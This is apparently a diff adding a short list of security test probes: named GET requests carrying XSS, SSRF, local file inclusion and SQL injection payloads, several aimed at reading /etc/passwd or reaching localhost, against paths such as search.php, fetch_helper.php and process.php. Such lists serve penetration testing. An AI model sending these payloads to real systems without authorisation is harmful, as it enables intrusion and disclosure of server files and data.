@@ -1,0 +1,13 @@
+XSS melolo raw	GET	/melolo/search.php?q=%3Cimg%20src%3Dx%20onerror%3Dalert(9)%3E
+XSS melolo quote	GET	/melolo/search.php?q=%22%3E%3Cb%3Ezzz%3C%2Fb%3E
+XSS reelife	GET	/reelife/search.php?q=%22%3E%3Cb%3Ezzz%3C%2Fb%3E
+SSRF fetch_helper localhost	GET	/ssh/fetch_helper.php?url=http%3A%2F%2F127.0.0.1%2Ftv%2Ftv.php
+SSRF fetch_helper passwd	GET	/ssh/fetch_helper.php?url=file%3A%2F%2F%2Fetc%2Fpasswd
+SSRF fetch_helper info	GET	/ssh/fetch_helper.php?url=http%3A%2F%2F127.0.0.1%2Finfo.php
+SSRF proxy bookId-url	GET	/drama/proxy.php?bookId=http%3A%2F%2F127.0.0.1%2F
+SSRF proxy bookId-localhost	GET	/drama/proxy.php?bookId=127.0.0.1&episode=1
+LFI config page	GET	/config/index.php?page=../../../etc/passwd
+LFI config page2	GET	/config/index.php?page=php%3A%2F%2F%2Fetc%2Fpasswd
+SQLi lacak squote	GET	/lacak-nomor/process.php?phone=0812%27%20OR%20%271%27%3D%271
+SQLi lacak sleep	GET	/lacak-nomor/process.php?phone=0812%27%20AND%20SLEEP(4)%20AND%20%271%27%3D%271
+SQLi lacak normal	GET	/lacak-nomor/process.php?phone=081299999999
